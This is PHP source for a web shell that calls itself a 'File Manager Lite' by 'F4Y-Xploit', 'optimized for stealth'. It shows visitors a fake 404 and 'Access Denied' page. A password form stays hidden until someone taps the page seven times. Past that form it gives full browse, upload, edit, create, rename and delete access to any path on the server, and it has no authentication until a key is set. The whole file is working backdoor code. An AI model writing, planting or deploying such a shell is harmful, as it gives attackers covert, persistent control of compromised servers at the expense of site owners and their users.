<?php
// PHP File Manager Lite - Optimized for Stealth and Speed
// Author: F4Y-Xploit (Simplified by AI)

session_start();
ini_set('display_errors', 0); // Sembunyikan error untuk stealth

$self = basename(__FILE__);
$lock_file = __DIR__ . '/.fs_lock';
$cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$cwd = $cwd ?: getcwd();
$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';

// Function to clean and display messages
function show_msg($m) {
    if (!empty($m)) {
        return "<div style='color:green;margin-bottom:10px;padding:5px;border:1px solid green;'>$m</div>";
    }
    return '';
}

// ===== AUTH =====
if (file_exists($lock_file) && !isset($_SESSION['unlocked'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        $hash = file_get_contents($lock_file);
        if (password_verify($_POST['pass'], $hash)) {
            $_SESSION['unlocked'] = true;
            header("Location: ?d=" . urlencode($cwd));
            exit;
        } else {
            $msg = "Akses ditolak";
        }
    }
        echo <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>404 Not Found</title>
<style>
  body {
    color: #444; margin:0; font: normal 14px/20px Arial, sans-serif; height:100%; background-color: #fff;
    display: flex; flex-direction: column; justify-content: space-between; align-items: center;
  }
  .main-content {
    text-align: center; width: 80%; max-width: 600px; margin: auto; padding-top: 15%;
  }
  .hidden-prompt {
    display: none; font-size: 16px; color: #333; padding: 10px; border: 1px solid #ccc;
    background: #f9f9f9; width: 300px; margin-top: 20px;
  }
  .footer {
    color: #888; font-size: 12px; padding: 10px 0; border-top: 1px solid #eee; width: 100%; text-align: center;
  }
</style>
</head>
<body ontouchstart="">
<div class="main-content">     
  <h1 style="margin:0; font-size:100px; font-weight:bold;">404</h1>
  <h2 style="margin-top:10px; font-size: 24px;">Resource Not Found</h2>
  <p>The requested file could not be located on this server.</p>
</div>

<div class="hidden-prompt" id="secret">
  <form method='post' style="display:flex; gap:5px;">
    <input type='password' name='pass' placeholder='Key' style="flex-grow:1; padding:5px;">
    <button style="padding:5px;">Enter</button>
  </form>
  <p style="color:red; font-size:12px;">$msg</p>
</div>

<div class="footer">
  LiteSpeed Web Server - Access Denied
</div>

<script>
  let tapCount = 0;
  let timer;

  ['click', 'touchstart'].forEach(eventType => {
    document.body.addEventListener(eventType, function () {
      tapCount++;
      clearTimeout(timer);

      if (tapCount >= 7) { // Mengurangi tap count agar lebih mudah
        document.getElementById('secret').style.display = 'block';
      }

      timer = setTimeout(() => {
        tapCount = 0;
      }, 800);
    });
  });
</script>
</body>
</html>
HTML;

    exit;
}
// ===== HELPERS (Simplified) =====
function list_dir($path) {
    $items = scandir($path);
    $dirs = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = "$path/$item";
        $info = [
            'name' => $item,
            'path' => $full,
            'is_dir' => is_dir($full),
            'size' => is_file($full) ? filesize($full) : '-'
        ];
        if (is_dir($full)) $dirs[] = $info;
        else $files[] = $info;
    }
    // Sort directories before files
    usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    return array_merge($dirs, $files);
}
function formatSize($b) {
    if (!is_numeric($b)) return '-';
    if ($b >= 1073741824) return round($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576) return round($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return round($b / 1024, 2) . ' KB';
    return $b . ' B';
}

function breadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $full = '';
    $out = ['<a href="?d=/">ROOT</a>'];
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $full .= '/' . $part;
        $out[] = "<a href='?d=" . urlencode($full) . "'>$part</a>";
    }
    return implode(" / ", $out);
}

// ===== ACTIONS =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['uploadfile'])) {
        $dest = $cwd . '/' . basename($_FILES['uploadfile']['name']);
        $ok = move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Upload OK" : "Upload Failed"));
        exit;
    }
    if (isset($_POST['newfile'])) {
        $ok = file_put_contents($cwd . '/' . $_POST['newfile'], $_POST['filedata']);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? "File Created" : "File Error"));
        exit;
    }
    if (isset($_POST['newfolder'])) {
        $ok = mkdir($cwd . '/' . $_POST['newfolder']);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Folder Created" : "Folder Error"));
        exit;
    }
    if (isset($_POST['setpass'])) {
        file_put_contents($lock_file, password_hash($_POST['setpass'], PASSWORD_DEFAULT));
        header("Location: ?d=" . urlencode($cwd) . "&msg=Key Saved");
        exit;
    }
    if (isset($_POST['editfile'])) {
        $ok = file_put_contents($_POST['filepath'], $_POST['filedata']);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? "Saved" : "Save Error"));
        exit;
    }
    if (isset($_POST['rename'])) {
        $old = $_POST['old'];
        $new = dirname($old) . '/' . basename($_POST['new']);
        $ok = rename($old, $new);
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Rename OK" : "Rename Failed"));
        exit;
    }
    if (isset($_POST['delpass'])) {
        if (file_exists($lock_file)) unlink($lock_file);
        header("Location: ?d=" . urlencode($cwd) . "&msg=Key Removed");
        exit;
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    $ok = is_dir($target) ? rmdir($target) : unlink($target);
    header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Deleted" : "Delete Failed"));
    exit;
}

// ===== EDIT PAGE =====
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    $data = htmlspecialchars(file_get_contents($f));
    echo "
    <!DOCTYPE html><html><head><title>Edit</title>
    <style>body{font-family:sans-serif;}</style>
    </head><body>
    <form method='post'>
    <h3 style='margin-bottom:5px;'>Edit: " . basename($f) . "</h3>
    <textarea name='filedata' style='width:98%;height:400px;border:1px solid #ccc;padding:10px;'>$data</textarea><br>
    <input type='hidden' name='filepath' value='$f'>
    <button name='editfile' style='padding:5px 10px;background:green;color:white;border:none;'>Save</button>
    <a href='?d=" . urlencode(dirname($f)) . "' style='margin-left:10px;'>Back</a>
    </form></body></html>";
    exit;
}

// ===== UI (Minimalist) =====
echo "<!DOCTYPE html><html><head><title>F-Mngr</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: Arial, sans-serif; margin: 15px; background: #f4f4f4; color: #333; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
.actions { margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
.actions a, .actions button { padding: 5px 10px; border: none; cursor: pointer; text-decoration: none; color: white; border-radius: 3px; }
.btn-upload { background: #007bff; } .btn-file { background: #6c757d; } .btn-folder { background: #6c757d; }
.btn-pass { background: #ffc107; color: #333; }
.btn-success { background: green; } .btn-danger { background: red; } .btn-secondary { background: #6c757d; color: white;}
table { width: 100%; border-collapse: collapse; margin-bottom: 20px; background: white; }
th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
th { background-color: #eee; }
a { text-decoration: none; color: #007bff; }
input[type=text], input[type=password], textarea, input[type=file] { padding: 5px; border: 1px solid #ccc; border-radius: 3px; }
.rename-form { display: flex; gap: 3px; }
.rename-form input { flex-grow: 1; width: auto; }
</style>
</head><body>";

echo show_msg($msg); // Tampilkan pesan

echo "<div class='header'>
    <h4 style='margin:0;'>Path: " . breadcrumbs($cwd) . "</h4>
    <button onclick='window.location.href=\"?d=" . urlencode($cwd) . "&action=password\"' class='btn-pass'>Key Settings</button>
</div>";

echo "<div class='actions'>";
echo "<form method='post' enctype='multipart/form-data' style='display:flex;gap:5px;'>
    <input type='file' name='uploadfile'>
    <button class='btn-upload' name='uploadfile'>Upload</button>
</form>";

echo "<a href='?d=" . urlencode($cwd) . "&action=create_file' class='btn-file'>+ File</a>";
echo "<a href='?d=" . urlencode($cwd) . "&action=create_dir' class='btn-folder'>+ Folder</a>";
echo "</div>";

if (isset($_GET['action'])) {
    echo "<a href='?d=" . urlencode($cwd) . "' class='btn-secondary' style='margin-bottom:10px;display:inline-block;'>&larr; Back</a>";
    if ($_GET['action'] === 'create_file') {
        echo "<form method='post'>
        <input name='newfile' placeholder='File name' style='width:98%;margin-bottom:5px;'><br>
        <textarea name='filedata' style='width:98%;height:200px;margin-bottom:5px;' placeholder='File content'></textarea><br>
        <button class='btn-success'>Save File</button></form>";
    } elseif ($_GET['action'] === 'create_dir') {
        echo "<form method='post'>
        <input name='newfolder' placeholder='Folder name' style='width:98%;margin-bottom:5px;'><br>
        <button class='btn-success'>Create Folder</button></form>";
    } elseif ($_GET['action'] === 'password') {
        echo "<form method='post' style='margin-bottom:10px;'>
        <input type='password' name='setpass' style='width:98%;margin-bottom:5px;' placeholder='Set new key'>
        <button class='btn-pass'>Save Key</button></form>
        <form method='post'>
        <input type='hidden' name='delpass' value='1'>
        <button class='btn-danger'>Remove Key</button></form>";
    }
    exit;
}

echo "<table><thead>
<tr><th>Name</th><th>Size</th><th>Actions</th></tr></thead><tbody>";

foreach (list_dir($cwd) as $i) {
    $n = htmlspecialchars($i['name']);
    $p = $i['path'];
    echo "<tr><td>" . ($i['is_dir'] ? "<a href='?d=" . urlencode($p) . "'>&#x1F4C1; $n</a>" : "&#x1F4C4; $n") . "</td>";
    echo "<td>" . formatSize($i['size']) . "</td>";
    echo "<td style='display:flex; gap:5px; align-items:center;'>
        <a href='?d=" . urlencode($cwd) . "&delete=" . urlencode($p) . "' class='btn-danger' onclick='return confirm(\"Delete $n?\")' title='Delete'>X</a>" .
        (!$i['is_dir'] ? "<a href='?d=" . urlencode($cwd) . "&edit=" . urlencode($p) . "' class='btn-success' title='Edit'>E</a>" : "") .
        "<form method='post' class='rename-form'>
            <input type='hidden' name='old' value='$p'>
            <input type='text' name='new' placeholder='Rename' style='width:100px;'>
            <button name='rename' class='btn-secondary' title='Rename'>R</button>
        </form>
    </td></tr>";
}
echo "</tbody></table></body></html>";
?>
